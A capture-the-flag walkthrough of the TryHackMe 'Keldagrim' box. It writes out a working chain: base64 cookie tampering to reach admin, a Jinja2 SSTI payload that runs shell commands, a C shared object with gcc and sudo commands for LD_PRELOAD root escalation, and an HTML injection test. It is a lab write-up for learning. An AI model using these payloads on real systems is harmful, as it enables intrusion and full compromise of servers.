 Box: Keldagrim — TryHackMe (Medium)

This box is rated medium, but it stands out for not relying on brute-force or guesswork. Instead, it rewards methodical enumeration, intelligent observation, and chaining multiple weaknesses. Let’s walk through how Keldagrim fell — step by step.
🧭 Reconnaissance

A basic nmap scan revealed:

22/tcp   open  ssh
80/tcp   open  http

The only noteworthy detail: the session cookie lacked the HttpOnly flag. So we browsed to the site and began exploring manually.

On the “Our Team” tab, we discovered two usernames: Jed and Jad. Always document potential usernames — I saved them in notes.txt.

On the "Buy Gold" page, there was an Admin option… but it was grayed out. Time to dig deeper.
🧪 Cookie Tampering & Access Control Bypass

Burp Suite intercepted the traffic, and the session cookie caught my eye — base64-encoded.

Z3Vlc3Q= → guest  
YWRtaW4= → admin

I modified the session cookie to admin, refreshed the page, and… boom — Admin interface unlocked! 🎯

We also noticed a new sales cookie. Decoding it revealed $2,165, matching what was shown on-screen. Odd, but not directly useful yet.

Then I spotted something interesting in the response headers:

Server: Werkzeug/1.0.1 Python/3.6.9

Seeing Werkzeug and Python screams Flask — and potential SSTI (Server-Side Template Injection).
🧠 Exploiting SSTI

To test SSTI, I submitted:

{{ 7*7 }}

The page returned 49. Confirmed: we had SSTI. Now for RCE.

By inspecting the Jinja2 object model, I located Popen (for executing shell commands) at index 401 in the list of object subclasses.

Here’s the payload that gave us command execution:

{{''.__class__.__mro__[1].__subclasses__()[401]('ls',shell=True,stdout=-1).communicate()}}

We used this to drop a reverse shell and got access to the box as a limited user. user.txt — ✔️
⚙️ Privilege Escalation (Root)

Running sudo -l revealed this key detail:

(env_keep+=LD_PRELOAD)

This opens the door for an LD_PRELOAD attack — allowing us to preload a malicious shared object to hijack execution.

Here’s the payload written in C:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/sh");
}

We compiled it:

gcc -fPIC -shared -o /tmp/shell.so exploit.c -nostartfiles

Then triggered it:

sudo LD_PRELOAD=/tmp/shell.so ps

And just like that — 🧨 Root shell obtained!
🕳️ Bonus — HTML Injection

Running nikto flagged a potential HTML Injection. I tested the payload it suggested:

<font size=50>

And the font ballooned on the page. Confirmed: vulnerable to HTML Injection.

While not impactful in a single-user CTF box, in a real-world app this could lead to phishing — injecting malicious forms to harvest credentials from other users.
🧠 Final Thoughts

Keldagrim is a solid challenge that teaches real-world techniques:

    Chaining SSTI to RCE

    Smart use of base64 tampering

    Advanced privesc with LD_PRELOAD

No wordlists. No brute force. Just knowledge, observation, and creative exploitation.
